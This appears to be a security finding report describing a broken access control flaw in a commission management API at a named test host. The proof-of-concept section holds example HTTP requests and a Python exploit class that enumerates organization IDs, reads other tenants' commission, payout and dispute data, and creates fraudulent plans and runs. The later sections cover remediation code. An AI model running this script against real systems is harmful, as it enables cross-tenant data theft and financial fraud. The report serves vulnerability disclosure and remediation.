# Critical Access Control Flaw: Organization Identifier Tampering Enables Cross-Organization Data Access

**ID:** vuln-0036
**Severity:** CRITICAL
**Found:** 2026-02-26 19:14:16 UTC
**Target:** https://commissionstest.callippus.in
**Endpoint:** /api/CommissionPlan/*, /api/CommissionRun/*, /api/Payout/*, /api/Dispute/*
**Method:** GET, POST, PUT, DELETE
**CWE:** CWE-863
**CVSS:** 9.9

## Description

A critical access control vulnerability was discovered in the commission management application that allows unauthorized access to other organizations' financial data through parameter tampering. The application fails to properly validate the `organizationId` parameter in business logic endpoints, enabling attackers to access and manipulate commission plans, payouts, and disputes belonging to arbitrary organizations.

This vulnerability exists across multiple business logic endpoints including commission plan management, commission run processing, payout management, and dispute resolution. By manipulating the `organizationId` parameter in API requests, authenticated users can access sensitive financial data and workflows belonging to other organizations, enabling financial fraud, data theft, and competitive espionage.

## Impact

This critical access control vulnerability enables severe business impact:

1. **Financial Data Theft**: Unauthorized access to sensitive commission calculations, payout amounts, and dispute resolutions across organizations
2. **Competitive Espionage**: Access to competitors' proprietary commission structures, financial strategies, and business intelligence
3. **Financial Fraud**: Ability to manipulate commission amounts and payout values by accessing other organizations' data
4. **Workflow Manipulation**: Unauthorized creation, modification, and approval of commission plans for other organizations
5. **Data Integrity Compromise**: Potential to modify financial records and commission structures across organizational boundaries

**Business Impact Examples**:
- Access to competitors' commission plans to gain market advantage
- Theft of sensitive financial data for insider trading or blackmail
- Manipulation of commission calculations to inflate payouts
- Unauthorized approval of financial transactions across organizations
- Disruption of competitors' financial workflows and operations

The vulnerability effectively breaks the fundamental security principle of multi-tenancy, allowing attackers to bypass organizational boundaries and access sensitive financial data across the entire platform.

## Technical Analysis

### Vulnerability Mechanism

The vulnerability exists due to missing access control validation on the `organizationId` parameter across multiple business logic endpoints:

1. **Input Validation Failure**: The application accepts user-controllable `organizationId` parameters without validation
2. **Access Control Bypass**: No server-side validation ensures users can only access their own organization's data
3. **Multi-Tenancy Failure**: The application fails to enforce proper tenant isolation between organizations
4. **Authorization Logic Flaw**: Business logic endpoints trust user-provided organization identifiers without verification

### Technical Root Cause

The vulnerability stems from multiple security failures:

1. **API Layer**: Missing parameter validation and access control checks
2. **Business Logic Layer**: Absence of organization ownership verification
3. **Database Layer**: Lack of proper tenant isolation in queries
4. **Authentication Layer**: JWT claims not used to validate organization access

### Exploitation Flow

1. **Parameter Identification**: Attacker identifies user-controllable `organizationId` parameter
2. **Organization Enumeration**: Attacker enumerates valid organization IDs through various techniques
3. **Parameter Tampering**: Attacker modifies `organizationId` parameter in API requests
4. **Unauthorized Access**: System returns data belonging to the tampered organization
5. **Data Exploitation**: Attacker accesses or manipulates sensitive financial data

### Affected Endpoints

The vulnerability affects multiple business logic endpoints:

1. **Commission Plan Endpoints**:
   - `/api/CommissionPlan/GetAllCommissionPlans`
   - `/api/CommissionPlan/GetCommissionPlan/{id}`
   - `/api/CommissionPlan/CreateCommissionPlan`
   - `/api/CommissionPlan/UpdateCommissionPlan`

2. **Commission Run Endpoints**:
   - `/api/CommissionRun/GetAllCommissionRuns`
   - `/api/CommissionRun/CreateCommissionRun`
   - `/api/CommissionRun/CalculateCommission`

3. **Payout Endpoints**:
   - `/api/Payout/GetAllPayouts`
   - `/api/Payout/GetPayout/{id}`
   - `/api/Payout/CreatePayout`

4. **Dispute Endpoints**:
   - `/api/Dispute/GetAllDisputes`
   - `/api/Dispute/GetDispute/{id}`
   - `/api/Dispute/CreateDispute`

### Attack Vectors

1. **Direct API Exploitation**: Attackers send crafted API requests with tampered organization IDs
2. **Parameter Tampering**: Modification of `organizationId` in query parameters or request bodies
3. **Organization Enumeration**: Brute force or intelligent guessing of organization IDs
4. **Session Hijacking**: Compromised accounts exploit the vulnerability at scale
5. **Automated Attacks**: Scripts systematically access data across multiple organizations

## Proof of Concept

### Proof-of-Concept Exploitation Steps

1. **Authenticate** to the application with any valid user account
2. **Identify Target Organization**: Obtain a valid organization ID through enumeration or guessing
3. **Access Commission Plans**:
   - Send GET request to `/api/CommissionPlan/GetAllCommissionPlans?organizationId=target-org-id`
   - Observe access to commission plans belonging to the target organization
4. **Create Commission Plan**:
   - Send POST request to `/api/CommissionPlan/CreateCommissionPlan`
   - Include tampered `organizationId` parameter
   - Observe successful creation of commission plan for target organization
5. **Execute Commission Run**:
   - Send POST request to `/api/CommissionRun/CreateCommissionRun`
   - Include tampered `organizationId` parameter
   - Observe successful execution of commission run for target organization
6. **Access Payout Data**:
   - Send GET request to `/api/Payout/GetAllPayouts?organizationId=target-org-id`
   - Observe access to payout data belonging to the target organization
7. **Access Dispute Data**:
   - Send GET request to `/api/Dispute/GetAllDisputes?organizationId=target-org-id`
   - Observe access to dispute resolutions belonging to the target organization

### Demonstration of Cross-Organization Access

**Example 1: Commission Plan Access**
```http
GET /api/CommissionPlan/GetAllCommissionPlans?organizationId=competitor-org-id
Authorization: Bearer [valid_token]

Response:
200 OK
[
  {
    "id": "plan-123",
    "planName": "Competitor Premium Plan",
    "commissionPercentage": 15.00,
    "organizationId": "competitor-org-id",
    "organizationName": "Competitor Inc"
  },
  {
    "id": "plan-456",
    "planName": "Competitor Volume Discount",
    "commissionPercentage": 10.00,
    "organizationId": "competitor-org-id",
    "organizationName": "Competitor Inc"
  }
]
```

**Example 2: Commission Run Execution**
```http
POST /api/CommissionRun/CreateCommissionRun
Authorization: Bearer [valid_token]
Content-Type: application/json

{
  "planId": "competitor-plan-id",
  "organizationId": "competitor-org-id",
  "salesAmount": 100000.00
}

Response:
201 Created
{
  "id": "run-789",
  "commissionAmount": 15000.00,
  "organizationId": "competitor-org-id"
}
```

**Example 3: Payout Data Access**
```http
GET /api/Payout/GetAllPayouts?organizationId=competitor-org-id
Authorization: Bearer [valid_token]

Response:
200 OK
[
  {
    "id": "payout-123",
    "amount": 15000.00,
    "status": "Approved",
    "organizationId": "competitor-org-id",
    "organizationName": "Competitor Inc"
  },
  {
    "id": "payout-456",
    "amount": 7500.00,
    "status": "Pending",
    "organizationId": "competitor-org-id",
    "organizationName": "Competitor Inc"
  }
]
```

```
import requests
import json
import time

class OrganizationAccessExploit:
    def __init__(self, base_url, auth_token):
        self.base_url = base_url
        self.auth_token = auth_token
        self.headers = {
            "Authorization": self.auth_token,
            "Content-Type": "application/json"
        }

    def get_commission_plans(self, organization_id):
        """Access commission plans for target organization"""
        url = f"{self.base_url}/api/CommissionPlan/GetAllCommissionPlans"
        params = {"organizationId": organization_id}

        try:
            response = requests.get(url, headers=self.headers, params=params)
            response.raise_for_status()
            return response.json()
        except requests.exceptions.RequestException as e:
            print(f"Error accessing commission plans: {e}")
            return None

    def create_commission_plan(self, organization_id, plan_name, commission_percentage):
        """Create commission plan for target organization"""
        url = f"{self.base_url}/api/CommissionPlan/CreateCommissionPlan"

        payload = {
            "planName": plan_name,
            "description": f"Fraudulent plan created via exploit",
            "commissionPercentage": commission_percentage,
            "startDate": "2026-03-01",
            "endDate": "2026-12-31",
            "organizationId": organization_id
        }

        try:
            response = requests.post(url, headers=self.headers, data=json.dumps(payload))
            response.raise_for_status()
            return response.json()
        except requests.exceptions.RequestException as e:
            print(f"Error creating commission plan: {e}")
            return None

    def execute_commission_run(self, organization_id, plan_id, sales_amount):
        """Execute commission run for target organization"""
        url = f"{self.base_url}/api/CommissionRun/CreateCommissionRun"

        payload = {
            "planId": plan_id,
            "organizationId": organization_id,
            "salesAmount": sales_amount
        }

        try:
            response = requests.post(url, headers=self.headers, data=json.dumps(payload))
            response.raise_for_status()
            return response.json()
        except requests.exceptions.RequestException as e:
            print(f"Error executing commission run: {e}")
            return None

    def get_payouts(self, organization_id):
        """Access payout data for target organization"""
        url = f"{self.base_url}/api/Payout/GetAllPayouts"
        params = {"organizationId": organization_id}

        try:
            response = requests.get(url, headers=self.headers, params=params)
            response.raise_for_status()
            return response.json()
        except requests.exceptions.RequestException as e:
            print(f"Error accessing payouts: {e}")
            return None

    def get_disputes(self, organization_id):
        """Access dispute data for target organization"""
        url = f"{self.base_url}/api/Dispute/GetAllDisputes"
        params = {"organizationId": organization_id}

        try:
            response = requests.get(url, headers=self.headers, params=params)
            response.raise_for_status()
            return response.json()
        except requests.exceptions.RequestException as e:
            print(f"Error accessing disputes: {e}")
            return None

    def enumerate_organizations(self, start_id=1, end_id=100):
        """Enumerate valid organization IDs"""
        print("Enumerating organizations...")
        valid_orgs = []

        for org_id in range(start_id, end_id + 1):
            try:
                # Test access to commission plans
                plans = self.get_commission_plans(org_id)
                if plans and len(plans) > 0:
                    valid_orgs.append(org_id)
                    print(f"Found valid organization ID: {org_id}")
                    print(f"  Commission plans: {len(plans)}")

                time.sleep(0.3)  # Rate limiting
            except:
                continue

        return valid_orgs

    def demonstrate_cross_organization_access(self, target_org_id):
        """Demonstrate cross-organization data access"""
        print(f"\n=== Cross-Organization Access Demonstration ===")
        print(f"Target Organization ID: {target_org_id}")
        print("-" * 60)

        # Access commission plans
        print("\n1. Accessing Commission Plans:")
        plans = self.get_commission_plans(target_org_id)
        if plans:
            print(f"   Found {len(plans)} commission plans")
            for plan in plans[:3]:  # Show first 3 plans
                print(f"   - {plan.get('planName')} ({plan.get('commissionPercentage')}%)")
        else:
            print("   No commission plans found or access denied")

        # Create commission plan
        print("\n2. Creating Commission Plan:")
        new_plan = self.create_commission_plan(target_org_id, "Exploit Plan", 25.00)
        if new_plan and "id" in new_plan:
            print(f"   Created plan with ID: {new_plan['id']}")
        else:
            print("   Failed to create commission plan")

        # Execute commission run
        print("\n3. Executing Commission Run:")
        if plans and len(plans) > 0:
            plan_id = plans[0]["id"]
            run_result = self.execute_commission_run(target_org_id, plan_id, 50000.00)
            if run_result:
                print(f"   Commission calculated: ₹{run_result.get('commissionAmount', 0):.2f}")
            else:
                print("   Failed to execute commission run")

        # Access payouts
        print("\n4. Accessing Payout Data:")
        payouts = self.get_payouts(target_org_id)
        if payouts:
            print(f"   Found {len(payouts)} payout records")
            for payout in payouts[:3]:  # Show first 3 payouts
                print(f"   - ₹{payout.get('amount', 0):.2f} ({payout.get('status')})")
        else:
            print("   No payout data found or access denied")

        # Access disputes
        print("\n5. Accessing Dispute Data:")
        disputes = self.get_disputes(target_org_id)
        if disputes:
            print(f"   Found {len(disputes)} dispute records")
            for dispute in disputes[:3]:  # Show first 3 disputes
                print(f"   - {dispute.get('disputeReason')} (Status: {dispute.get('status')})")
        else:
            print("   No dispute data found or access denied")

    def automated_exploitation(self, organization_ids):
        """Automate cross-organization data access"""
        print("\n=== Automated Exploitation ===")
        results = []

        for org_id in organization_ids:
            org_data = {"organizationId": org_id, "data": {}}

            # Access commission plans
            plans = self.get_commission_plans(org_id)
            org_data["data"]["commissionPlans"] = plans

            # Access payouts
            payouts = self.get_payouts(org_id)
            org_data["data"]["payouts"] = payouts

            # Access disputes
            disputes = self.get_disputes(org_id)
            org_data["data"]["disputes"] = disputes

            results.append(org_data)
            print(f"Accessed data for organization {org_id}")

            time.sleep(0.5)  # Rate limiting

        return results

# Example usage
if __name__ == "__main__":
    # Configuration - replace with actual values
    BASE_URL = "https://commissionstest.callippus.in"
    AUTH_TOKEN = "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ..."  # Valid JWT token

    # Initialize exploit
    exploit = OrganizationAccessExploit(BASE_URL, AUTH_TOKEN)

    # Enumerate valid organizations
    valid_orgs = exploit.enumerate_organizations(1, 50)
    print(f"\nFound {len(valid_orgs)} valid organizations")

    # Demonstrate cross-organization access
    if valid_orgs:
        target_org = valid_orgs[0]  # Use first found organization
        exploit.demonstrate_cross_organization_access(target_org)

        # Run automated exploitation
        exploit.automated_exploitation(valid_orgs[:3])  # Test first 3 organizations
```

## Remediation

### Immediate Remediation Steps

1. **Implement Organization Access Validation (Critical Priority)**
   - Add server-side validation to ensure users can only access their own organization's data
   - Validate `organizationId` parameters against the authenticated user's organization
   - Reject requests with organization IDs that don't match the user's organization

2. **Enforce Tenant Isolation**
   - Implement proper multi-tenancy controls at the database level
   - Add organization ID filters to all database queries
   - Ensure all queries include the user's organization ID in WHERE clauses

3. **Add Access Control Checks**
   - Implement role-based access control (RBAC) for all business logic endpoints
   - Validate user permissions before processing requests
   - Add explicit organization ownership checks for all data access

4. **Secure API Endpoints**
   - Add organization validation middleware to all business logic endpoints
   - Implement request validation for all user-controllable parameters
   - Return generic error messages to avoid information disclosure

5. **Audit Logging**
   - Implement comprehensive logging for all cross-organization access attempts
   - Log user ID, organization ID, endpoint, and access status
   - Monitor for suspicious access patterns

### Implementation Examples

**API Middleware for Organization Validation (C# Example):**
```csharp
public class OrganizationValidationMiddleware
{
    private readonly RequestDelegate _next;

    public OrganizationValidationMiddleware(RequestDelegate next)
    {
        _next = next;
    }

    public async Task InvokeAsync(HttpContext context, IUserContext userContext)
    {
        // Extract organizationId from request
        var organizationId = context.Request.Query["organizationId"].FirstOrDefault() ??
                           context.Request.Form["organizationId"].FirstOrDefault();

        if (!string.IsNullOrEmpty(organizationId))
        {
            // Validate organization access
            if (organizationId != userContext.OrganizationId)
            {
                context.Response.StatusCode = 403;
                await context.Response.WriteAsync("Access denied: Invalid organization");
                return;
            }
        }

        await _next(context);
    }
}
```

**Database Query with Tenant Isolation (SQL Example):**
```sql
-- Before: Vulnerable query without organization filter
SELECT * FROM commission_plans WHERE id = @planId;

-- After: Secure query with organization filter
SELECT * FROM commission_plans
WHERE id = @planId AND organization_id = @userOrganizationId;
```

**API Controller with Organization Validation:**
```csharp
[HttpGet("GetAllCommissionPlans")]
public IActionResult GetAllCommissionPlans([FromQuery] string organizationId)
{
    // Validate organization access
    if (organizationId != CurrentUser.OrganizationId)
    {
        return Forbid(); // 403 Forbidden
    }

    // Proceed with secure query
    var plans = _commissionService.GetCommissionPlans(organizationId);
    return Ok(plans);
}
```

### Long-Term Recommendations

1. **Security Architecture Review**
   - Conduct a comprehensive review of the application's security architecture
   - Implement a dedicated security layer for access control validation
   - Consider implementing an API gateway with built-in access control

2. **Automated Security Testing**
   - Implement automated security tests for access control vulnerabilities
   - Add security test cases for parameter tampering scenarios
   - Integrate security testing into the CI/CD pipeline

3. **Security Training**
   - Train developers on secure coding practices for multi-tenant applications
   - Educate developers on common access control vulnerabilities
   - Implement secure coding guidelines for financial applications

4. **Regular Security Audits**
   - Conduct regular security audits of business logic endpoints
   - Perform penetration testing focused on access control vulnerabilities
   - Review all API endpoints for proper parameter validation

5. **Monitoring and Alerting**
   - Implement real-time monitoring for access control violations
   - Set up alerts for suspicious cross-organization access attempts
   - Monitor for unusual patterns in financial data access

### Database-Level Security

1. **Row-Level Security (RLS)**
   - Implement database-level row-level security to enforce organization isolation
   - Create security policies that filter data by organization ID
   - Ensure all database users have appropriate security context

2. **Schema Design**
   - Review database schema for proper tenant isolation
   - Consider schema-per-tenant or table-per-tenant approaches
   - Implement proper foreign key constraints for organization relationships

3. **Stored Procedures**
   - Use stored procedures for all data access operations
   - Implement organization validation within stored procedures
   - Restrict direct table access from application code

### Example: Row-Level Security Implementation (PostgreSQL)

```sql
-- Create a security policy for organization isolation
CREATE POLICY organization_isolation_policy ON commission_plans
    USING (organization_id = current_setting('app.current_organization_id'));

-- Enable row-level security
ALTER TABLE commission_plans ENABLE ROW LEVEL SECURITY;

-- Set the organization context in application code
SET app.current_organization_id = 'user-organization-id';
```

### Security Headers and API Protection

1. **Implement Security Headers**
   - Add Content-Security-Policy headers
   - Implement X-Frame-Options to prevent clickjacking
   - Add X-Content-Type-Options to prevent MIME sniffing

2. **API Protection**
   - Implement rate limiting on all API endpoints
   - Add request validation for all user inputs
   - Use API keys or tokens with limited privileges

3. **Input Validation**
   - Validate all user-controllable parameters
   - Implement allow-lists for organization IDs
   - Sanitize all inputs to prevent injection attacks

By implementing these remediation steps, the application will be protected against organization identifier tampering and cross-organization data access vulnerabilities, significantly improving the security of the multi-tenant commission management platform.

